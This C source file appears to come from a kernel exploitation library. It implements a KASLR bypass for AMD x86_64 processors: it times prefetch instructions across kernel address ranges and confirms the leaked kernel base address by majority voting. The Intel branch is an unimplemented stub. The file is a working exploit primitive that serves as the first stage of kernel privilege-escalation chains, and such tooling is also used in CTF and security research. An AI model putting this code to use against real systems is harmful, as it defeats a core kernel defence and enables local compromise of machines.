#include <kpwn/logger.h>
#include <kpwn/utils.h>
#include <kpwn/x86_64/side_channel.h>
#include <stdint.h>
#include <string.h>

#define MAX_TRIALS 16

size_t kasld_amd() {
  return kasld_amd_with_conf(
      0xffffffff81000000ull,  // start
      0xffffffffc0000000ull,  // end
      0x0000000000080000ull,  // step
      7,                      // num_confirm
      11                      // window_size
  );
}

size_t kasld_amd_with_conf(size_t start, size_t end,
                           size_t step, size_t num_confirm,
                           size_t window_size) {
  ASSERT_MSG(start < end,
             "Start address must be less than end address");
  ASSERT_MSG((end - start) % step == 0,
             "Range must be divisible by step size");

  size_t num_steps = (end - start) / step;

  REP1(MAX_TRIALS) {
    uint64_t found_bases[num_confirm];

    REP2(try, num_confirm) {
      size_t checking_address[num_steps];
      size_t times[num_steps];

      REP2(i, num_steps) {
        checking_address[i] = start + step * i;
        times[i] = SIZE_MAX;
      }

      REP1(16) {
        REP2(i, num_steps) {
          times[i] = MIN(
              times[i],
              measure_prefetch((void*)checking_address[i]));
        }
      }

      uint64_t max_value = 0;
      uint64_t max_index = 0;
      REP2(base_idx, num_steps - window_size) {
        size_t sum = 0;
        REP2(i, window_size) {
          sum += times[base_idx + i];
        }

        if (sum > max_value) {
          max_value = sum;
          max_index = base_idx;
        }
      }

      found_bases[try] = checking_address[max_index];
    }

    struct count_sort_data majority =
        count_sort(found_bases, num_confirm);

    if (majority.counter > num_confirm / 2) {
      log_succ("[side channel] found kbase at %lx",
               majority.data);
      return majority.data;
    }
  }

  log_erro("could not get majority voting...");
  return 0;
}

size_t kasld_intel() {
  log_erro("Unimplemented");
}

size_t kasld() {
  switch (get_arch()) {
    case x86_64_intel:
      return kasld_intel();
    case x86_64_amd:
      return kasld_amd();
    default:
      log_erro("Unsupported architecture for kasld");
      return 0;
  }
}

enum side_channel_arch get_arch() {
  char info[0x10];
  cpuinfo_str(info);

  if (strcmp(info, "GenuineIntel") == 0) {
    return x86_64_intel;
  } else if (strcmp(info, "AuthenticAMD") == 0) {
    return x86_64_amd;
  } else {
    log_warn("Unknown CPU architecture: %s", info);
    return unknown_arch;
  }
}
